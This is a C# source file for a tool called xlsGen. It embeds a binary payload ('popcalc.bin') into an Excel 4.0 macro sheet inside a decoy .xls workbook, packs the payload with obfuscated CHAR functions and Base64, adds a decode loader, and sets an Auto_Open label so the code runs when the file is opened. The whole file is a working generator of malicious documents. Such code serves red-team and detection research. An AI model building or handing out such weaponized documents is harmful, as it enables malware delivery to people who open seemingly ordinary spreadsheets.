using b2xtranslator.Spreadsheet.XlsFileFormat;
using b2xtranslator.Spreadsheet.XlsFileFormat.Records;
using b2xtranslator.StructuredStorage.Reader;
using b2xtranslator.xls.XlsFileFormat.Records;
using Macrome;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace xlsGen
{

    class Program
    {
        private static WorkbookStream LoadDecoyDocument(string decoyDocPath)
        {
            using (var fs = new FileStream(decoyDocPath, FileMode.Open))
            {
                StructuredStorageReader ssr = new StructuredStorageReader(fs);
                var wbStream = ssr.GetStream("Workbook");
                byte[] wbBytes = new byte[wbStream.Length];
                wbStream.Read(wbBytes, 0, wbBytes.Length, 0);

                WorkbookStream wbs = new WorkbookStream(wbBytes);
                return wbs;
            }
        }


        private static List<BiffRecord> GetDefaultMacroSheetRecords(bool isInternationalSheet = true)
        {
            string defaultMacroPath =  @"default_macro_template.xls";
            using (var fs = new FileStream(defaultMacroPath, FileMode.Open))
            {
                StructuredStorageReader ssr = new StructuredStorageReader(fs);
                var wbStream = ssr.GetStream("Workbook");
                byte[] wbBytes = new byte[wbStream.Length];
                wbStream.Read(wbBytes, 0, wbBytes.Length, 0);
                WorkbookStream wbs = new WorkbookStream(wbBytes);
                //The last BOF/EOF set is our Macro sheet.
                List<BiffRecord> sheetRecords = wbs.GetRecordsForBOFRecord(wbs.GetAllRecordsByType<BOF>().Last());

                if (isInternationalSheet)
                {
                    WorkbookStream internationalWbs = new WorkbookStream(sheetRecords);
                    internationalWbs = internationalWbs.InsertRecord(new Intl(), internationalWbs.GetAllRecordsByType<b2xtranslator.Spreadsheet.XlsFileFormat.Records.Index>().First());
                    return internationalWbs.Records;
                }

                return sheetRecords;
            }

        }

            static void Main(string[] args) 
            {
            Console.WriteLine(@" ====================================== ");
            Console.WriteLine(@"  xlsGen v1.0, by aaaddress1@chroot.org");
            Console.WriteLine(@"  github.com/aaaddress1/xlsGen");
            Console.WriteLine(@" ====================================== ");
            Console.WriteLine();

            var decoyDocPath = @"decoy_document.xls";
                Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);

                List<BiffRecord> defaultMacroSheetRecords = GetDefaultMacroSheetRecords();

                WorkbookStream wbs = LoadDecoyDocument(decoyDocPath);
                Console.WriteLine(wbs.ToDisplayString()); // that'll be cool if there's a hex-print :)

                List<string> sheetNames = wbs.GetAllRecordsByType<BoundSheet8>().Select(bs => bs.stName.Value).ToList();
                List<string> preambleCode = new List<string>();
                WorkbookEditor wbe = new WorkbookEditor(wbs);

                var macroSheetName = "Sheet2";
                wbe.AddMacroSheet(defaultMacroSheetRecords, macroSheetName, BoundSheet8.HiddenState.Visible);

                List<string> macros = null;
                byte[] binaryPayload = null;
                int rwStart = 0, colStart = 2, dstRwStart = 0, dstColStart = 0;
                int curRw = rwStart, curCol = colStart;

        
                binaryPayload = File.ReadAllBytes("popcalc.bin");
                wbe.SetMacroBinaryContent(binaryPayload, 0, dstColStart + 1, 0, 0, SheetPackingMethod.ObfuscatedCharFunc, PayloadPackingMethod.Base64);
                curRw = wbe.WbStream.GetFirstEmptyRowInColumn(colStart) + 1;
                macros = MacroPatterns.GetBase64DecodePattern(preambleCode);

            //Orginal: wbe.SetMacroSheetContent(macros, 0, 2, dstRwStart, dstColStart, SheetPackingMethod.ObfuscatedCharFuncAlt);
            macros.Add("=GOTO(R1C1)");
                wbe.SetMacroSheetContent_NoLoader(macros, rwStart, colStart);
                wbe.InitializeGlobalStreamLabels();
                wbe.AddLabel("Auto_Open", rwStart, colStart);

            #region save Workbook Stream to file
            WorkbookStream createdWorkbook = wbe.WbStream;
            ExcelDocWriter writer = new ExcelDocWriter();
            string outputPath = "a.xls";
            Console.WriteLine("Writing generated document to {0}", outputPath);
            writer.WriteDocument(outputPath, createdWorkbook, null);
            #endregion 
        }
    }
}

